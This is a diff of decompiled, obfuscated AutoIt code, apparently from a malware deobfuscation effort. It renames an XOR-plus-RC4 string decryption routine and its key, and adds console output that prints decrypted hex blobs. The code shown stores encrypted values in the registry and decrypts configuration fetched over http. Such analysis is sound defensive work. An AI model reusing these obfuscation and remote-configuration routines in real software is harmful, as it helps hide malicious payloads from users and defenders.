 	If $Arg00 <> 0 And $Arg00 <> 1 Then
 		SetError(1)
 		Return ""
-	ElseIf $Arg01 = "" Or $Arg02 = "" Then
+	ElseIf $EncodedString = "" Or $DecryptionKey = "" Then
 		SetError(1)
 		Return ""
 	Else
@@ -3940,15 +3943,15 @@ Func Fn00A8($Arg00, $Arg01, $Arg02, $ArgOpt03 = 1)
 				$Var0427 = ""
 				$Var0426 = ""
 				$Var0425 = ""
-				For $Var0427 = 1 To StringLen($Arg01)
-					If $Var0426 = StringLen($Arg02) Then
+				For $Var0427 = 1 To StringLen($EncodedString)
+					If $Var0426 = StringLen($DecryptionKey) Then
 						$Var0426 = 1
 					Else
 						$Var0426 += 1
 					EndIf
-					$Var0425 = $Var0425 & Chr(BitXOR(Asc(StringMid($Arg01, $Var0427, 1)), Asc(StringMid($Arg02, $Var0426, 1)), 0x00FF))
+					$Var0425 = $Var0425 & Chr(BitXOR(Asc(StringMid($EncodedString, $Var0427, 1)), Asc(StringMid($DecryptionKey, $Var0426, 1)), 0x00FF))
 				Next
-				$Arg01 = $Var0425
+				$EncodedString = $Var0425
 				$Var0429 = ""
 				$Var042A = 0
 				$Var042B = ""
@@ -3960,7 +3963,7 @@ Func Fn00A8($Arg00, $Arg01, $Arg02, $ArgOpt03 = 1)
 				$Local0028 = ""
 				Local $Local0028[0x0100][2]
 				For $Var0429 = 0 To 0x00FF
-					$Local0028[$Var0429][1] = Asc(StringMid($Arg02, Mod($Var0429, StringLen($Arg02)) + 1, 1))
+					$Local0028[$Var0429][1] = Asc(StringMid($DecryptionKey, Mod($Var0429, StringLen($DecryptionKey)) + 1, 1))
 					$Local0028[$Var0429][0] = $Var0429
 				Next
 				For $Var0429 = 0 To 0x00FF
@@ -3969,14 +3972,14 @@ Func Fn00A8($Arg00, $Arg01, $Arg02, $ArgOpt03 = 1)
 					$Local0028[$Var0429][0] = $Local0028[$Var042A][0]
 					$Local0028[$Var042A][0] = $Var0428
 				Next
-				For $Var0429 = 1 To StringLen($Arg01)
+				For $Var0429 = 1 To StringLen($EncodedString)
 					$Var042B = Mod(($Var042B + 1), 0x0100)
 					$Var042C = Mod(($Var042C + $Local0028[$Var042B][0]), 0x0100)
 					$Var042D = $Local0028[Mod(($Local0028[$Var042B][0] + $Local0028[$Var042C][0]), 0x0100)][0]
-					$Var042F = BitXOR(Asc(StringMid($Arg01, $Var0429, 1)), $Var042D)
+					$Var042F = BitXOR(Asc(StringMid($EncodedString, $Var0429, 1)), $Var042D)
 					$Var042E &= Hex($Var042F, 2)
 				Next
-				$Arg01 = $Var042E
+				$EncodedString = $Var042E
 			Next
 		Else
 			For $Var0430 = 0 To $ArgOpt03 Step 1
@@ -3990,7 +3993,7 @@ Func Fn00A8($Arg00, $Arg01, $Arg02, $ArgOpt03 = 1)
 				$Local0028 = ""
 				Local $Local0028[0x0100][2]
 				For $Var0429 = 0 To 0x00FF
-					$Local0028[$Var0429][1] = Asc(StringMid($Arg02, Mod($Var0429, StringLen($Arg02)) + 1, 1))
+					$Local0028[$Var0429][1] = Asc(StringMid($DecryptionKey, Mod($Var0429, StringLen($DecryptionKey)) + 1, 1))
 					$Local0028[$Var0429][0] = $Var0429
 				Next
 				For $Var0429 = 0 To 0x00FF
@@ -3999,29 +4002,29 @@ Func Fn00A8($Arg00, $Arg01, $Arg02, $ArgOpt03 = 1)
 					$Local0028[$Var0429][0] = $Local0028[$Var042A][0]
 					$Local0028[$Var042A][0] = $Var0428
 				Next
-				For $Var0429 = 1 To StringLen($Arg01) Step 2
+				For $Var0429 = 1 To StringLen($EncodedString) Step 2
 					$Var042B = Mod(($Var042B + 1), 0x0100)
 					$Var042C = Mod(($Var042C + $Local0028[$Var042B][0]), 0x0100)
 					$Var042D = $Local0028[Mod(($Local0028[$Var042B][0] + $Local0028[$Var042C][0]), 0x0100)][0]
-					$Var042F = BitXOR(Dec(StringMid($Arg01, $Var0429, 2)), $Var042D)
+					$Var042F = BitXOR(Dec(StringMid($EncodedString, $Var0429, 2)), $Var042D)
 					$Var042E = $Var042E & Chr($Var042F)
 				Next
-				$Arg01 = $Var042E
+				$EncodedString = $Var042E
 				$Var0427 = ""
 				$Var0426 = ""
 				$Var0425 = ""
-				For $Var0427 = 1 To StringLen($Arg01)
-					If $Var0426 = StringLen($Arg02) Then
+				For $Var0427 = 1 To StringLen($EncodedString)
+					If $Var0426 = StringLen($DecryptionKey) Then
 						$Var0426 = 1
 					Else
 						$Var0426 += 1
 					EndIf
-					$Var0425 &= Chr(BitXOR(Asc(StringMid($Arg01, $Var0427, 1)), Asc(StringMid($Arg02, $Var0426, 1)), 0x00FF))
+					$Var0425 &= Chr(BitXOR(Asc(StringMid($EncodedString, $Var0427, 1)), Asc(StringMid($DecryptionKey, $Var0426, 1)), 0x00FF))
 				Next
-				$Arg01 = $Var0425
+				$EncodedString = $Var0425
 			Next
 		EndIf
-		Return $Arg01
+		Return $EncodedString
 	EndIf
 EndFunc
 
@@ -4626,7 +4629,7 @@ Func Fn00B2($Arg00, $Arg01)
 	While 1
 		$Var043F = $Var043F + 1
 		$Var0448 = FileReadLine($Arg00, $Var043F)
-		$Var0449 = Fn00A8(0, $Var0448, $Var032F, 1)
+		$Var0449 = Decrypt(0, $Var0448, $EncryptionKey, 1)
 		If $Var043F = 3 Then
 			If $Var0449 <> ";start" Then ExitLoop
 		EndIf
@@ -4646,7 +4649,7 @@ Func Fn00B3()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "H4D8D5U96581H3Y321VBNM1M1MBN"
 			$Var0372 = "LLFPD879S54D6B84654654CVBCVB654CVB654CB"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var029D = StringLen($Var02C6)
 			If $Var029C = $Var029D Then
 			Else
@@ -4734,7 +4737,7 @@ EndFunc
 Func Fn00B7($Arg00, $Arg01, $Arg02, $Arg03, $Arg04)
 	$Var044E = 0
 	If RegRead($Arg02, $Arg03) <> "" Then
-		$Var03D2 = Fn00A8(0, RegRead($Arg02, $Arg03), $Arg04, 4)
+		$Var03D2 = Decrypt(0, RegRead($Arg02, $Arg03), $Arg04, 4)
 	Else
 		$Var03D2 = Fn009B($Arg00)
 		If @error = 1 Then
@@ -4743,7 +4746,7 @@ Func Fn00B7($Arg00, $Arg01, $Arg02, $Arg03, $Arg04)
 			$Var044F = StringSplit($Var03D2, ";")
 			If $Var044F[0] = 4 Then
 				If StringLen($Var044F[2]) = 2 Then
-					$Var0402 = RegWrite($Arg02, $Arg03, "REG_SZ", Fn00A8(1, $Var03D2, $Arg04, 4))
+					$Var0402 = RegWrite($Arg02, $Arg03, "REG_SZ", Decrypt(1, $Var03D2, $Arg04, 4))
 				EndIf
 			Else
 				$Var03D2 = "-1"
@@ -4759,7 +4762,7 @@ Func Fn00B7($Arg00, $Arg01, $Arg02, $Arg03, $Arg04)
 				$Var044F = StringSplit($Var03D2, ";")
 				If $Var044F[0] = 4 Or $Var044F[0] = 2 Then
 					If StringLen($Var044F[2]) = 2 Then
-						$Var0402 = RegWrite($Arg02, $Arg03, "REG_SZ", Fn00A8(1, $Var03D2, $Arg04, 4))
+						$Var0402 = RegWrite($Arg02, $Arg03, "REG_SZ", Decrypt(1, $Var03D2, $Arg04, 4))
 					EndIf
 				Else
 					$Var03D2 = "-1"
@@ -4777,7 +4780,7 @@ Func Fn00B8()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "Yz00yzlslnnnlsd654fSDF5654SB"
 			$Var0372 = "Yz1slnnnlsd654fSDF5654S"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03F8 = StringSplit($Var02C6, "~")
 			If $Var03F8[0] = 9 Then
 				$Var0330 = $Var03F8[1]
@@ -4927,7 +4930,7 @@ Func Fn00BB($Arg00, $Arg01, $Arg02, $Arg03, $ArgOpt04 = "", $ArgOpt05 = "")
 			$Var045F[0] += 1
 		Until $Var0464 = 8
 	EndIf
-	Fn0092($Var045F, 9 - $Var0462, ";" & Fn00A8(1, $Arg02 & "!" & $Arg01, $Arg03, 1))
+	Fn0092($Var045F, 9 - $Var0462, ";" & Decrypt(1, $Arg02 & "!" & $Arg01, $Arg03, 1))
 	$Var0465 = Fn0094($Var045F, @CRLF, 1)
 	If $ArgOpt05 <> "" Then
 		$Var0466 = StringInStr($Var0465, "", 0, 1)
@@ -5585,10 +5588,10 @@ Func Fn00DC($Arg00)
 	Else
 		If $Var0325 <> "" And StringRegExp($Var0325, "http://") = 1 Then
 			$Var0325 = Fn009B($Var0325)
-			If StringRegExp($Var0325, Fn00A8(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Fn00A8(1, "D?�", 0x00012837, 1)) = 1 Then
-				$Var0325 = StringReplace($Var0325, Fn00A8(1, "*S_", 0x000173AB, 1), "")
-				$Var0325 = StringReplace($Var0325, Fn00A8(1, "D?�", 0x00012837, 1), "")
-				$Var0325 = Fn00A8(0, $Var0325, 0x000100BD, 1)
+			If StringRegExp($Var0325, Decrypt(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Decrypt(1, "D?�", 0x00012837, 1)) = 1 Then
+				$Var0325 = StringReplace($Var0325, Decrypt(1, "*S_", 0x000173AB, 1), "")
+				$Var0325 = StringReplace($Var0325, Decrypt(1, "D?�", 0x00012837, 1), "")
+				$Var0325 = Decrypt(0, $Var0325, 0x000100BD, 1)
 				$Var04C2 = StringSplit($Var0325, "~")
 				If IsArray($Var04C2) Then
 					For $Var04C3 = 1 To $Var04C2[0]
@@ -5738,10 +5741,10 @@ EndFunc
 Func Fn00E3()
 	If $Var0325 <> "" And StringRegExp($Var0325, "http://") = 1 Then
 		$Var0325 = Fn009B($Var0325)
-		If StringRegExp($Var0325, Fn00A8(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Fn00A8(1, "D?�", 0x00012837, 1)) = 1 Then
-			$Var0325 = StringReplace($Var0325, Fn00A8(1, "*S_", 0x000173AB, 1), "")
-			$Var0325 = StringReplace($Var0325, Fn00A8(1, "D?�", 0x00012837, 1), "")
-			$Var0325 = Fn00A8(0, $Var0325, 0x000100BD, 1)
+		If StringRegExp($Var0325, Decrypt(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Decrypt(1, "D?�", 0x00012837, 1)) = 1 Then
+			$Var0325 = StringReplace($Var0325, Decrypt(1, "*S_", 0x000173AB, 1), "")
+			$Var0325 = StringReplace($Var0325, Decrypt(1, "D?�", 0x00012837, 1), "")
+			$Var0325 = Decrypt(0, $Var0325, 0x000100BD, 1)
 			$Var04C2 = StringSplit($Var0325, "~")
 			If IsArray($Var04C2) Then
 				For $Var04C3 = 1 To $Var04C2[0]
@@ -5932,35 +5935,35 @@ Func Fn00EA()
 EndFunc
 
 Func Fn00EB()
-	$Var032F = "A0P52MA78LS9O7EN1UI89A7B9NP6254FU1E3NA2S154HQ987"
-	ConsoleWrite($Var032F & @CRLF)
-	$Var0330 = ""
-	$Var0331 = ""
-	$Var0332 = ""
-	$Var0333 = ""
-	$Var0334 = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73E35463F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $Var032F, 2)
+	$EncryptionKey = "A0P52MA78LS9O7EN1UI89A7B9NP6254FU1E3NA2S154HQ987"
+	ConsoleWrite($EncryptionKey & @CRLF)
+	;$Var0330 = ""
+	;$Var0331 = ""
+	;$Var0332 = ""
+	;$Var0333 = ""
+	$Var0334 = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73E35463F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
 	ConsoleWrite($Var0334 & @CRLF)
-	$Var0335 = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C924ADC0EB60FB75FCAFBF1EC30271C8620D05C1ED40BCD86D78DA37A791A9AE124A6239AF6EF24624E6E9D95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73D35343F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $Var032F, 2)
+	$Var0335 = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C924ADC0EB60FB75FCAFBF1EC30271C8620D05C1ED40BCD86D78DA37A791A9AE124A6239AF6EF24624E6E9D95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73D35343F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
 	ConsoleWrite($Var0335 & @CRLF)
-	$Var0336 = ""
-	$Var0337 = ""
-	$Var0338 = ""
+	;$Var0336 = ""
+	;$Var0337 = ""
+	;$Var0338 = ""
 EndFunc
 
 Func Fn00EC()
-	$Var0339 = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C914AD60EB673C15FCBFBF3EC34271B8624D15A1ED50CCE86D48DD77A7A1A99E657A6519AF6EF25624E6F9A95749C544AF41CF9DA73D1FA6263E0C3C1D9B0EFC73D35463F9CD017317C48D3", $Var032F, 2)
+	$Var0339 = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C914AD60EB673C15FCBFBF3EC34271B8624D15A1ED50CCE86D48DD77A7A1A99E657A6519AF6EF25624E6F9A95749C544AF41CF9DA73D1FA6263E0C3C1D9B0EFC73D35463F9CD017317C48D3", $EncryptionKey, 2)
 	ConsoleWrite($Var0339 & @CRLF)
-	$Var033A = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F51C914ADC0EB60FC35FCAFCF2EC30271C8620D1591ED40CC886D78DD47A7D649CE123DA239AF6EF5962496E9A92049C564A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $Var032F, 2)
+	$Var033A = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F51C914ADC0EB60FC35FCAFCF2EC30271C8620D1591ED40CC886D78DD47A7D649CE123DA239AF6EF5962496E9A92049C564A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $EncryptionKey, 2)
 	ConsoleWrite($Var033A & @CRLF)
-	$Var033B = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419295F262E634A80EB573C55FCBFCF3EC30271C8620D0591ED50BCA86D7F1D17A7D649CE123DA259AF1EA2662496E9A92039C524A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $Var032F, 2)
+	$Var033B = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419295F262E634A80EB573C55FCBFCF3EC30271C8620D0591ED50BCA86D7F1D17A7D649CE123DA259AF1EA2662496E9A92039C524A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $EncryptionKey, 2)
 	ConsoleWrite($Var033B & @CRLF)
-	$Var033C = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754192908C1C914AAB0EB60FB75FCEFCF5EC31276E8627D1291ED70CC881A58DD67A7B1A9EE121A6259D81EA58624A6F9A95749C554AF31CF9DA08D1F91E6BE7B3C1D9B0EEC73E32473F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $Var032F, 2)
+	$Var033C = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754192908C1C914AAB0EB60FB75FCEFCF5EC31276E8627D1291ED70CC881A58DD67A7B1A9EE121A6259D81EA58624A6F9A95749C554AF31CF9DA08D1F91E6BE7B3C1D9B0EEC73E32473F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
 	ConsoleWrite($Var033C & @CRLF)
 EndFunc
 
 Func Fn00ED()
-	$Var033D = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F71C9134D70EB60FB75FCBFCF2EC30271C8620D15B1ED40BCA86D48DD67A79649DE123DA249AF6EA5862496E9B92049D574AF41DF9DA0ED1F96262E0C5C1DDB0EFC73E35473AEBD714317C48D4133230ACBED7B1DB", $Var032F, 2)
+	$Var033D = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F71C9134D70EB60FB75FCBFCF2EC30271C8620D15B1ED40BCA86D48DD67A79649DE123DA249AF6EA5862496E9B92049D574AF41DF9DA0ED1F96262E0C5C1DDB0EFC73E35473AEBD714317C48D4133230ACBED7B1DB", $EncryptionKey, 2)
 	ConsoleWrite($Var033D & @CRLF)
-	$Var033E = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EFC73D32443F9FD714317848D5133231ABBED7B1DA974FD8100BCE2C3E502C8EC3FAE8D5B7E327E509", $Var032F, 2)
+	$Var033E = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EFC73D32443F9FD714317848D5133231ABBED7B1DA974FD8100BCE2C3E502C8EC3FAE8D5B7E327E509", $EncryptionKey, 2)
 	ConsoleWrite($Var033E & @CRLF)
 EndFunc
